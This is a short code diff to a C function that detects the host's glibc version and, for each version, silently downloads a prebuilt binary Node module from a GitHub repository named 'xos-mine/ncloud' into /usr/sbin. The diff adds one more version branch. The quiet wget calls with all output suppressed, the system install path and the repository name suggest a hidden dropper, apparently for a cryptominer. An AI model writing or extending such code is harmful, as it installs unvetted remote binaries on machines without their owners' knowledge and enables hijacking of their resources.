@@ -64,6 +64,8 @@ void detect_libc() {
             // cek versi GLIBC spesifik
             if (strstr(buffer, "2.39-0ubuntu8.4")) {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/1.node >/dev/null 2>&1");
+            } else if (strstr(buffer, "2.39-0ubuntu8.5")) {
+                system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/1.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.35-0ubuntu3.10")) {
                 system("wget -q -O /usr/sbin/ncloud/build/Release/N.node https://github.com/xos-mine/ncloud/raw/refs/heads/main/build/Release/2.node >/dev/null 2>&1");
             } else if (strstr(buffer, "2.31-0ubuntu9.7")) {
